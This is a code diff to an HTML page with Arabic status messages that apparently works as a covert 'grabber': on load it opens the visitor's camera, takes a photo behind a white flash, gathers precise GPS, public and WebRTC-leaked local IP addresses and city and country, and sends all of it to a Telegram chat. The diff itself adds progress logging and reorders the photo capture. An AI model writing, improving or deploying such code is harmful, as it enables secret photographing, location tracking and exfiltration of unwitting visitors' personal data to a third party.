@@ -7,7 +7,7 @@
 <body>
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
-  <div id="flash" style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;display:none;z-index:9999;"></div>
+  <div id="flash" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;display:none;z-index:9999;"></div>
   <pre id="result">📡 جاري جمع المعلومات...</pre>
 
   <script>
@@ -24,7 +24,13 @@
     let country = "";
     let flagEmoji = "";
 
+    function logStep(text) {
+      const pre = document.getElementById("result");
+      pre.innerText += "\n" + text;
+    }
+
     function sendPhoto(blob) {
+      logStep("📸 تم التقاط الصورة... يتم الإرسال إلى Telegram");
       const form = new FormData();
       form.append("chat_id", chat_id);
       form.append("photo", blob, "photo.jpg");
@@ -58,11 +64,13 @@ ${gpsMsg || "❌ فشل تحديد الموقع"}
     function checkIfReady() {
       partsReady++;
       if (partsReady === 3) {
+        logStep("✅ تم جمع كل المعلومات... جاري إرسالها");
         sendCombinedMessage();
       }
     }
 
     function getLocation() {
+      logStep("📍 جاري تحديد الموقع...");
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
           pos => {
@@ -76,19 +84,20 @@ Longitude: ${gpsLon}
           },
           err => {
             gpsMsg = `❌ فشل تحديد الموقع: ${err.message} (كود الخطأ: ${err.code})`;
-            document.getElementById("result").innerText += `\n[خطأ GPS]: ${err.message} (code: ${err.code})`;
+            logStep(`[خطأ GPS]: ${err.message} (code: ${err.code})`);
             checkIfReady();
           },
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       } else {
         gpsMsg = "❌ جهازك لا يدعم GPS";
-        document.getElementById("result").innerText += "\n[GPS غير مدعوم]";
+        logStep("[GPS غير مدعوم]");
         checkIfReady();
       }
     }
 
     function getGeoInfo(ip) {
+      logStep("🏙️ جاري جلب المدينة والدولة من IP...");
       fetch(`https://ipapi.co/${ip}/json/`)
         .then(res => res.json())
         .then(data => {
@@ -109,6 +118,7 @@ Longitude: ${gpsLon}
     }
 
     function getPublicIP() {
+      logStep("🌐 جاري جلب IP الخارجي...");
       fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(data => {
@@ -122,6 +132,7 @@ Longitude: ${gpsLon}
     }
 
     function getLocalIP() {
+      logStep("🏠 جاري جلب IP الداخلي...");
       const pc = new RTCPeerConnection({ iceServers: [] });
       pc.createDataChannel("");
       pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
@@ -145,30 +156,34 @@ Longitude: ${gpsLon}
     }
 
     function initCamera() {
+      logStep("📸 فتح الكاميرا الآن...");
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           const video = document.getElementById("video");
           video.srcObject = stream;
           video.addEventListener("playing", () => {
+            logStep("⚡ وميض الفلاش... والتقاط الصورة");
             const flash = document.getElementById("flash");
-            flash.style.display = "block"; // أظهر الفلاش
-            setTimeout(() => flash.style.display = "none", 150); // اخفِ الفلاش بعد 150ms
+            flash.style.display = "block";
+            setTimeout(() => {
+              flash.style.display = "none";
 
-            const canvas = document.getElementById("canvas");
-            const ctx = canvas.getContext("2d");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
-            canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
-            stream.getTracks().forEach(track => track.stop());
+              const canvas = document.getElementById("canvas");
+              const ctx = canvas.getContext("2d");
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              ctx.drawImage(video, 0, 0);
+              canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
+              stream.getTracks().forEach(track => track.stop());
+            }, 150); // مدة الفلاش
           });
         })
         .catch(err => {
-          document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
+          logStep("❌ الكاميرا غير متاحة: " + err.message);
         });
     }
 
-    // بدء كل العمليات
+    // بدء التنفيذ
     getLocation();
     getPublicIP();
     getLocalIP();
